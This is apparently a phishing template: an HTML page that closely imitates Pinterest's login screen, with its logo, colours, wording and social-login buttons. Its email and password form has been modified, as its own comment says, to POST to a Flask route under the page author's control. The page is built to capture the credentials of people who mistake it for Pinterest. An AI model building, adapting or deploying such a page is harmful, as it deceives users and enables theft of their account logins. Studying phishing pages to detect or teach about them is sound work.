<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Pinterest</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #333333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px 16px;
        }

        .main-card {
            background-color: #ffffff;
            width: 100%;
            max-width: 480px;
            border-radius: 32px;
            padding: 32px 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Official Pinterest Brand Logo */
        .pinterest-logo {
            width: 48px;
            height: 48px;
            margin-bottom: 16px;
        }

        .title {
            font-size: 32px;
            font-weight: 600;
            color: #333333;
            margin-bottom: 8px;
            letter-spacing: -1px;
        }

        .subtitle {
            font-size: 16px;
            color: #333333;
            margin-bottom: 24px;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 4px;
            width: 100%;
        }

        .input-label {
            font-size: 12px;
            color: #333333;
            margin-left: 8px;
        }

        .input-field {
            width: 100%;
            height: 48px;
            padding: 0 16px;
            border: 2px solid #cdcdcd;
            border-radius: 16px;
            font-size: 16px;
            outline: none;
            color: #333333;
            background-color: #ffffff;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            border-color: #0084ff;
        }

        .forgot-link {
            font-size: 14px;
            font-weight: 600;
            color: #333333;
            text-decoration: none;
            align-self: flex-start;
            margin-left: 8px;
            margin-top: 2px;
            margin-bottom: 8px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .btn-submit {
            width: 100%;
            height: 44px;
            background-color: #e60023;
            border: none;
            border-radius: 24px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #ad081b;
        }

        /* Divider */
        .divider {
            margin: 16px 0;
            font-size: 14px;
            font-weight: 600;
            color: #333333;
        }

        /* Social Login Buttons */
        .social-buttons {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .btn-social {
            width: 100%;
            height: 44px;
            border-radius: 24px;
            font-size: 15px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            background-color: #f1f1f1;
            color: #333333;
            border: none;
            transition: background-color 0.2s;
        }

        .btn-social:hover {
            background-color: #e2e2e2;
        }

        .btn-facebook {
            background-color: #1877f2;
            color: #ffffff;
        }

        .btn-facebook:hover {
            background-color: #166fe5;
        }

        .social-svg {
            width: 18px;
            height: 18px;
        }

        /* Terms & Footer */
        .terms-text {
            font-size: 11px;
            color: #767676;
            margin-top: 16px;
            line-height: 14px;
        }

        .terms-text a {
            color: #767676;
            font-weight: 700;
            text-decoration: none;
        }

        .footer-text {
            margin-top: 20px;
            font-size: 12px;
            font-weight: 600;
            color: #333333;
        }

        .footer-text a {
            color: #333333;
            text-decoration: none;
            font-weight: 700;
        }
    </style>
</head>
<body>

    <main class="main-card">
        <svg class="pinterest-logo" viewBox="0 0 24 24" fill="#e60023">
            <path d="M12 0C5.373 0 0 5.372 0 12c0 5.084 3.163 9.426 7.627 11.174-.105-.949-.2-2.405.042-3.441.218-.937 1.407-5.965 1.407-5.965s-.359-.719-.359-1.782c0-1.668.967-2.914 2.171-2.914 1.023 0 1.518.769 1.518 1.69 0 1.029-.655 2.568-.994 3.995-.283 1.194.599 2.169 1.777 2.169 2.133 0 3.772-2.249 3.772-5.495 0-2.873-2.064-4.882-5.012-4.882-3.414 0-5.418 2.561-5.418 5.207 0 1.031.397 2.138.893 2.738.098.119.112.224.083.345l-.333 1.36c-.053.22-.174.267-.402.161-1.499-.698-2.436-2.889-2.436-4.649 0-3.785 2.75-7.262 7.929-7.262 4.163 0 7.398 2.967 7.398 6.931 0 4.136-2.607 7.464-6.227 7.464-1.216 0-2.359-.631-2.75-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146C9.57 23.812 10.763 24 12 24c6.627 0 12-5.373 12-12 0-6.628-5.373-12-12-12z"/>
        </svg>

        <h1 class="title">Welcome to Pinterest</h1>
        <p class="subtitle">Find new ideas to try</p>

        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
        <form class="login-form" action="{{ url_for('login') }}" method="POST">
            <div class="input-group">
                <label class="input-label" for="email">Email</label>
                <input type="email" id="email" name="username" class="input-field" placeholder="Email" required />
            </div>

            <div class="input-group">
                <label class="input-label" for="password">Password</label>
                <input type="password" id="password" name="password" class="input-field" placeholder="Password" required />
            </div>

            <a href="#" class="forgot-link">Forgot your password?</a>

            <button type="submit" class="btn-submit">Log in</button>
        </form>

        <div class="divider">OR</div>

        <div class="social-buttons">
            <button class="btn-social btn-facebook">
                <svg class="social-svg" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                Continue with Facebook
            </button>

            <button class="btn-social">
                <svg class="social-svg" viewBox="0 0 24 24">
                    <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.14h6.6c-.28 1.52-1.13 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-8.8z"/>
                    <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.26v3.15C3.25 21.3 7.31 24 12 24z"/>
                    <path fill="#FBBC05" d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.58H1.26C.46 8.17 0 9.99 0 12s.46 3.83 1.26 5.42l4.02-3.15z"/>
                    <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.25 2.7 1.26 6.58l4.02 3.15c.95-2.83 3.6-4.98 6.72-4.98z"/>
                </svg>
                Continue with Google
            </button>
        </div>

        <p class="terms-text">
            By continuing, you agree to Pinterest's <a href="#">Terms of Service</a> and acknowledge you've read our <a href="#">Privacy Policy</a>.
        </p>

        <div class="footer-text">
            Not on Pinterest yet? <a href="#">Sign up</a>
        </div>
    </main>

</body>
</html>
